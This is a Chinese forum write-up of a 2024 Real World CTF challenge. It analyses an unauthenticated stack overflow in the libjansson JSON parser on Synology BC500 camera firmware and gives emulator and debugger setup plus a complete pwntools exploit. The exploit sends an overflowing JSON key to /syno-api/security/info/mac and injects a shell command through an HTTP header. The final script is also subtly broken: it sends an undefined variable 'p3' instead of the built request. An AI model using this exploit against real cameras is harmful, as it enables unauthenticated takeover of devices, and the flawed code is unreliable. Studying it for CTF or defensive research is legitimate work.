---
title: 2024 RWCTF群晖 BC500摄像头RCE--未授权+栈溢出
url: https://forum.butian.net/share/3650
source: 奇安信攻防社区
date: 2024-08-07
fetch_date: 2025-10-06T18:00:42.087843
---

# 2024 RWCTF群晖 BC500摄像头RCE--未授权+栈溢出

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 2024 RWCTF群晖 BC500摄像头RCE--未授权+栈溢出

* [CTF](https://forum.butian.net/topic/52)

此漏洞是来自于一场Real Word CTF比赛真实环境下看到的，这里拿来复现一下，此溢出点要想溢出到返回地址是不可能的，这里介绍下劫持结构体，在结构体里控制执行流，漏洞点在libjansson.so.4.7.0里的parse\_object，在json解析key造成了栈溢出，通过构造能够达到远程rce

RWCTF群晖 BC500摄像头RCE--未授权+栈溢出
----------------------------
此漏洞是来自于一场Real Word CTF比赛真实环境下看到的，这里拿来复现一下，此溢出点要想溢出到返回地址是不可能的，这里介绍下劫持结构体，在结构体里控制执行流，漏洞点在libjansson.so.4.7.0里的parse\\_object，在json解析key造成了栈溢出，通过构造能够达到远程rce，调用链子如下：
parse\\_object-&gt;parse\\_value-&gt;json\\_loads，而json\\_loads最终调用，我们来分析下，由于是CVE，具体编号不知道，所以这里直接找到漏洞位置 /lib/libjansson.so.4.7.0，我们进行逆向分析下，这里去符号表了，如果硬逆很难，但由于libjansson.so.4.7.0是开源项目，我们直接去github上去找下源码，结合起来分析，源码位置<https://github.com/akheron/jansson>，我们结合起来分析
由于ida去符号表了，所以我们使用定位关键字符串来找到位置NUL byte in object
然后就可以看到了漏洞位置
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722131232463-3210b7e4-058a-4771-a645-aec69c712d58.png)
这里是由\\_isoc99\\_sscanf 进行的一个栈溢出，在解析key的时候对v9和v10造成了栈溢出，但这里调试是无法覆盖返回地址的，因为它会把key和value给覆盖掉，导致程序不能正常运行，所以这里结合源码分析，这里用vscode进行分析，把ida没有识别的函数给重命名下
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722131449239-c476ef5e-4f1b-45f0-a859-54eda63a27f5.png)
通过源码，在ida重新命名了下
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722131670924-b8901731-d445-4d31-9a2b-4b32e8c19c84.png)
这里没法覆盖返回地址，那我们就去看下有没有可用的结构体，发现下面有个lex\\_scan函数，这里我们结合源码去看下，看看有没有可以用到的条件，发现在load.c里 在初始化各个函数的时候，前面已经把结构体定义好了，这样我们溢出的时候直接算好偏移溢出到对应结构体即可，我们看下这个结构体
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722131953449-d5907dae-60d8-4ddf-9a57-19e4d0c2c5ea.png)
这里发现是lex\\_scan的结构体，那么我们可以劫持stream\\_t的get\\_func get 函数指针为我们的恶意地址，这样就可以控制执行流，那这时候就有个疑问，那怎么可以知道劫持执行流了呢，我们看看都什么地方调用了stream-&gt;get
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722132230061-c0f57a44-cd63-42ea-b64b-27e79c4e6aa1.png)
在stream\\_get处调用了，然后继续查看stream\\_get 在什么位置进行调用
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722132308042-5e4527bb-3709-4478-baf5-c34d35a6f9a7.png)
lex\\_get lex\\_get\\_save都在调用，接着我们去看下在什么位置调用这两个函数
我们发现在lex\\_scan\\_string处调用了，lex\\_scan\\_string最终也会被lex\\_scan\\_string调用
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722132551155-d13f4f91-d9bc-4482-bb3e-283f9c45684b.png)
在lex\\_scan处直接调用了lex\\_get，但这里需要满足条件才可以去执行
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722132619799-c334b886-2551-44ca-a3d2-f9a73e1e04e1.png)
不过最终都会执行对应stream-&gt;get 来达到控制执行流的目的，整体分析下来已经知道了漏洞位置以及如何利用，下面我们就要看看什么地方可控可以来达到最终的利用，这里我们就来验证上面我们所说的链子，如何一步一步验证出来是这样调用的，我们用ida 交叉引用看到在sub\\_6EF4 也就是parse\\_value调用
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722133052013-2805d596-4c0e-42a8-9359-9ab96862d970.png)
我们继续看下parse\\_value在什么位置调用，通过搜索在parse\\_json有调用，接着看下parse\\_json在什么位置调用
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722133452118-63691cc1-0c9d-4ae4-af41-01a7b6d5629a.png)
parse\\_json在json\\_loads位置调用，那什么地方调用了json\\_loads，这个时候就需要回到题目文件系统里了
，grep -r “json\\_loads"
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722133595005-deeefe7c-94e1-4ab2-923d-00e251ee07db.png)
发现有很多binary 在调用，这里我们选择webd，因为它是个摄像头处理的主要文件webserver
我们ida逆向下，呜呜这里又去符号表了，真的难受啊呜呜只能硬逆了，不知道为啥我看看雪佬的文章都是没有去除的，这里我用ida都去除 了，只能自己重命名了，呜呜呜难受，这里首先找下handle\\_main处理函数
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722134031493-7f51ced6-742e-4091-82ce-90d7af667aec.png)
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722134059750-68feb518-faf1-48b1-86b1-ff7cca6347c7.png)
发现有个api接口，接口对应处理的是sub\\_35CEC, 这个函数主要处理后端不同的cgi请求处理，由于我们不知道前端账号密码，我们需要找到未授权，逆向下
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722134301762-1dd0c8bc-4f41-426e-a5d1-218be350917d.png)
发现没有执行路由会执行到/www/camera-cgi/synocam\\_param.cgi这个cgi，那我们就去扫描下目录，去看看有什么可以未授权的访问路径，这里用dirsearch，通过扫描发现/syno-api/security/info/mac可以调用
下面我们接着去分析下这个cgi，在start里找到了处理路由函数
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722135059893-91f6afe7-10b3-4bd0-8a36-909582f8d23d.png)
在post里，发现传入的数据直接进到了sub\\_11624
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722135122166-acc7360d-7a2b-4133-830d-3a8c3560db66.png)
sub\\_11624 直接调用了json\\_loads
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722135151199-8e596767-cc0c-424b-bbf8-e3fdbbabfc05.png)
最后的最后我们整体逆向和漏洞挖掘已经找到思路和利用手法，接下来我们就需要写脚本去执行调试就行了
这里写下环境搭建，题目会给个run.sh，我们改下run.sh
```php
#!/bin/sh
qemu-system-arm \\
   \-m 1024 \\
   \-M virt,highmem\=off \\
   \-kernel zImage \\
       \-initrd player.cpio \\
   \-nic user,hostfwd\=tcp:0.0.0.0:8801-:80,hostfwd\=tcp:0.0.0.0:8802-:8802,hostfwd\=tcp:0.0.0.0:1234-:1234 \\
   \-nographic
~
```
映射80为本地8801 然后telnet为8802 gdb调试为1234
我们需要开启下里面 的telnet，这里直接在/etc/init.d/rcS,更改如下
```php
#!/bin/sh
\# source profile\\_prjcfg on /etc/init.d/rcS (init script cycle) and /etc/profile (after startup cycle)
source /etc/profile\\_prjcfg
telnetd \-p 9901 \-l /bin/sh
​
\# fstab devices create
​
mount \-a
​
echo "ker" &gt; /proc/nvt\\_info/bootts
echo "rcS" &gt; /proc/nvt\\_info/bootts
​
\# To run /etc/init.d/S\\* script
​
for initscript in /etc/init.d/S\[0-9\]\[0-9\]\\*
do
   if \[ \-x $initscript \]; then
       echo "\[Start\] $initscript"
       $initscript
   fi
done
​
echo "rcS" &gt; /proc/nvt\\_info/bootts
telnetd \-p 8802 \-l /bin/sh
```
如何我们要调试的话，把对应版本gdbserver 放到目录下，然后再打包find . | cpio -o --format=newc &gt; ../player.cpio，就可以了
下步就是run.sh，然后gdb-multiarch webd
用telnet localhost 8802连接
ps 查看进程名
gdbserver :1234 --attach 进程号
接着执行如下命令
```php
target remote :1234
set follow-fork-mode parent
catch fork
c
set follow-fork-mode child
catch exec
c
```
我们通过父进程创建子进程的方式去调试
执行完上面的步骤，并没有完全进到cgi里，这里vmmap查看cgi的基地址加上0x7464，下个断点，c下，这样就能完整加载出来libjansson了，最后我们直接把断点下到 parse\\_object 的scanf栈溢出位置
b \\*基地址+0x6BC4,然后继续C就可以调了，由于没有符号表硬调，发现stream-&gt;get在0xa4左右位置，那么就可以直接填冲到这个位置就行了，这里选着一个好用的gadget，劫持get为这个地址，这里地址需要\\uxxx\\uxxx\\uxxx这样写，不然的话会报错
![img](https://cdn.nlark.com/yuque/0/2024/png/22994699/1722136049018-a7ea969e-d27d-42a6-94d7-522d1f80ccf5.png)
配合通过'$HTTP\\_A' 在下面定义个A：cat /flag &gt; /www/index.html里 ，即可rce
完整的exp：
```python
from pwn import \*
context(arch='arm', os='linux', log\_level='debug')
ip = '127.0.0.1'
port = 8801
r = remote(ip, port)
shell = b'$HTTP\_A'
shell = shell.ljust(8, b';')
payload = b'a ' + b'b' \* (0x60 + 0x24 - 8) + shell + b'\u005c\u004d\u0041'
json = b'{"' + payload + b'": ""}'
pay = b''
pay += b'POST /syno-api/security/info/mac HTTP/1.1' + b'\r\n'
pay += (b"Content-Length: %d" % len(json)) + b'\r\n'
pay += b'A: cat /flag &gt; /www/index.html' + b'\r\n'
pay += b'Accept: text/plain, \*/\*; q=0.01' + b'\r\n'
pay += b'Content-Type: application/json' + b'\r\n'
pay += b'\r\n'
pay += json
r.send(p3)
r.interactive()
```
总结：通过这个题能学到很多实战上的技巧，感觉这些技巧大部分都可以通用，逆向的时候是累了点，但逆明白了还是很开心的，另我担忧的是如果实战没有开源项目，都是去符号表真的会G呜呜，只能通过gdb硬调了，没办法呜呜，继续加油吧，未来多复现这样的题或者CVE，累复现了两天呜呜

* 发表于 2024-08-06 09:37:15
* 阅读 ( 5836 )
* 分类：[硬件与物联网](https://forum.butian.net/community/Hardware%20and%20IOT)

1 推荐
 收藏

## 0 条评论

请先 [登录](https://forum.butian.net/login) 后评论

[![Azd](https://forum.butian.net/static/images/default_avatar.jpg)](https://forum.butian.net/people/7129)

[Azd](https://forum.butian.net/people/7129)

5 篇文章

[奇安信攻防社区](https://forum.butian.net)|
联系我们

|
[sitemap](https://forum.butian.net/sitemap)

Copyright © 2013-2023 BUTIAN.NET 版权所有 [京ICP备18014330号-2](https://beian.miit.gov.cn/#/Integrated/index)

×

#### 发送私信

请先 [登录](https://forum.butian.net/login) 后发送私信

×

#### 举报此文章

垃圾广告信息：
广告、推广、测试等内容

违规内容：
色情、暴力、血腥、敏感信息等内容

不友善内容：
人身攻击、挑衅辱骂、恶意行为

其...